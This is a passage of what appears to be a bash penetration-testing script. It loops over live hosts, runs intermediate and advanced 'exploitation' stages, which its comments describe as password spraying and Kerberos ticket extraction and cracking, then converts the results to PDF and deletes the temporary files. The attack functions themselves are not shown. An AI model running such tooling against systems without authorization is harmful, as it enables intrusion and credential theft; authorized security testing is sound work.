INTERMEDIATE_EXPLOITATION() {
    # Iterate through all live hosts listed in the file
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        # Directory and result files for this host.
        host_dir="$working_dir/${ip}"
        scan_result_txt="$host_dir/result_${ip}.txt"
        dc_users_txt="$host_dir/dc_users_${ip}.txt"

        # Print a colored status line to the terminal and append a header to the host's result file.
        echo -e "\e[31m[*]\e[0m\e[32m Exploitation: ${ip}\e[0m"
        echo -e "\nINTERMEDIATE EXPLOITATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_exploitation
        B_EXPLOITATION
        ### i_exploitation
        I_EXPLOITATION
    done
}



# ADVANCED_EXPLOITATION - run vulnerability scans, password-spraying, and Kerberos ticket extraction/cracking per host (B + I + A exploitation).
ADVANCED_EXPLOITATION() {

    # Iterate through all live hosts listed in the file
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        # Directory and result files for this host.
        host_dir="$working_dir/${ip}"
        scan_result_txt="$host_dir/result_${ip}.txt"
        dc_users_txt="$host_dir/dc_users_${ip}.txt"
        dc_creds_txt="$host_dir"/dc_creds_${ip}.txt
        tickets_txt="$host_dir"/tickets_${ip}.txt

        # Print a colored status line to the terminal and append a header to the host's result file.
        echo -e "\e[31m[*]\e[0m\e[32m Exploitation: ${ip}\e[0m"
        echo -e "\nADVANCED EXPLOITATION RESULT FOR ${ip}\n" >> "$scan_result_txt" 2>/dev/null

        ### b_exploitation
        B_EXPLOITATION
        ### i_exploitation
        I_EXPLOITATION
        ### a_exploitation
        A_EXPLOITATION
    done
}




# STOP - # STOP - converts result files to PDF, cleans up, 
# displays script execution time, and exits.
STOP() {

    echo -e "\n\e[31m[!]\e[0m\e[32m CONVERSION OF RESULTS TO PDF...\e[0m"

    # Convert result_${ip}.txt to PDF
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        host_dir="$working_dir/${ip}"
        scan_result_txt="$host_dir/result_${ip}.txt"
        scan_result_pdf="$host_dir/result_${ip}.pdf"

        if [ -f "$scan_result_txt" ]; then
            enscript -q -p - "$scan_result_txt" | ps2pdf - "$scan_result_pdf" 2>/dev/null &
            SPINNER $!
        else
            echo -e "\e[91m[!] File $scan_result_txt not found, skipping PDF conversion for $ip\e[0m"
        fi
    done

    echo -e "\e[31m[!]\e[0m\e[32m DELETION OF TEMPORARY FILES...\e[0m"

    # Delete all *.txt files in each host directory
    for ip in $(cat "$working_dir/live_hosts.txt"); do
        host_dir="$working_dir/${ip}"
        find "$host_dir" -type f -name "*.txt" -delete
    done

    # Remove temporary data directory
    rm -rf "$data"

    # Record script end time and calculate duration
    local script_end=$(date +%s)
    local duration=$((script_end - script_start))
    echo -e "\e[31m[*]\e[0m\e[32m Script finished. \e[0mDuration: $((duration / 60)) min $((duration % 60)) sec"
}



START
